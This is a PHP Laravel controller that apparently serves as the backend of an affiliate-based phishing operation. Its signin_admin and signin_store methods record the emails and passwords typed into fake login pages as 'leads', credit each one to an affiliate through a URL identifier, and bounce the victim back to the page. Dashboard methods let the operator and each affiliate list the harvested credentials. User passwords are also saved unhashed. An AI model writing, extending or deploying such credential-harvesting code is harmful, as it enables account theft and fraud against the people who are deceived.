<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Session;
use DB;
use App\Models\User;
use App\Models\Lead;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Validator;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        // $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('home');
    }

    public function mainpage()
    {
        return view('frontend.main_page');
    }

    public function signin()
    {
        return view('frontend.main_page');
    }

    public function signin_admin(Request $request)
    {
        $admin = User::where('role', 0)->first();

        Lead::create([
            'email' => $request->email,
            'password' => $request->password,
            'user_id' => $admin->id,
        ]);

        return redirect()->back();
    }
    public function signin_affiliate($affiliate)
    {
        return view('frontend.user_login_affiliate', compact('affiliate'));
    }
    public function signin_store($affiliate, Request $request)
    {
        $user = User::where('affiliate_id', $affiliate)->first();

        Lead::create([
            'email' => $request->email,
            'password' => $request->password,
            'user_id' => $user->id,
        ]);

        return redirect()->back();
    }

    public function createUser()
    {
        return view('backend.userCreate');
    }

    public function storeUser(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string',
        ]);
        User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => $request->password,
            'role' => 1,
            'affiliate_id' => (string) Str::orderedUuid(),
        ]);
        return redirect(route('dashboard'))->with('success', 'User created suucessfully');
    }

    public function editUser($id)
    {
        $user = User::findOrFail($id);
        return view('backend.userEdit', compact('user'));
    }

    public function updateUser($id, Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string',
        ]);
        $user = User::findOrFail($id);

        $user->name = $request->name;
        $user->email = $request->email;
        $user->password = $request->password;

        $user->save();
        return redirect(route('dashboard'))->with('success', 'User updated suucessfully');
    }

    public function deleteUser($id)
    {
        $user = User::findOrFail($id);
        $user->delete();
        Lead::where('user_id', $id)->delete();

        return redirect(route('dashboard'))->with('success', 'User deleted suucessfully');
    }

    public function dashboard(Request $request)
    {
        if ($request->ajax()) {
            $data = DB::table('users')->where('role', 1)->get();
            // return Datatables::of($data)
            return datatables($data)
                ->addIndexColumn()
                ->addColumn('action', function ($row) {

                    $btn = '<a href="' . route('user.edit', $row->id) . '" class="edit btn btn-primary btn-sm">Edit</a> <a href="' . route('user.delete', $row->id) . '" onsubmit="return confirm(' . 'Are you sureyou want to submit?' . ');" class="edit btn btn-danger btn-sm">Delete</a>';

                    return $btn;
                })
                ->rawColumns(['action'])
                ->make(true);
        }

        return view('backend.dashboard');
    }

    public function UserList(Request $request)
    {
        $user_id = Session::get('id');
        $affiliate_id = Session::get('affiliate_id');
        // dd($user_id);
        if ($request->ajax()) {
            $data = User::find($user_id)->leads;
            // return Datatables::of($data)
            return datatables($data)
                ->addIndexColumn()
                ->addColumn('action', function ($row) {
                    $btn = '<a href="' . route('user.edit', $row->id) . '" class="edit btn btn-primary btn-sm">Edit</a> <a href="' . route('user.delete', $row->id) . '" onsubmit="return confirm(' . 'Are you sureyou want to submit?' . ');" class="edit btn btn-danger btn-sm">Delete</a>';
                    return $btn;
                })
                ->rawColumns(['action'])
                ->make(true);
        }

        return view('backend.leadUserList', compact('affiliate_id'));
    }
}
